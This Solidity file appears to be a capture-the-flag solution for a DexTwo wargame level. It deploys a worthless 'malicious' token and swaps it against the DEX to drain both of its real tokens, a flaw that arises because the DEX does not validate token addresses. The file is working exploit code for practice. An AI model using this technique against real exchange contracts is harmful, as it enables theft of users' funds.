// SPDX-License-Identifier: MIT
import "../../src/DexTwo/DexTwo.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/utils/math/Math.sol";

pragma solidity ^0.8.0;
contract DexTwoExploit {

    DexTwo public victim;
    MaliciousFungibleToken public myToken;

    constructor(address payable _victim){
        victim = DexTwo(_victim);
        myToken = new MaliciousFungibleToken(address(victim), "malicious", "MAL", 3);
    }

    function hack() public {
        // Approve the victim DexTwo to spend our tokens
        myToken.approve(address(victim), type(uint256).max);

        // Transfer 1 token to the DexTwo contract
        myToken.transfer(address(victim), 1);

        // Swap 1 of our tokens for token1
        address token1 = victim.token1();
        victim.swap(address(myToken), token1, 1);

        // Swap 1 of our tokens for token2
        address token2 = victim.token2();
        victim.swap(address(myToken), token2, 1);
    }

    receive() external payable {
    }
}


contract MaliciousFungibleToken is SwappableTokenTwo {

    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) SwappableTokenTwo(dexInstance, name, symbol, initialSupply) {
    }
}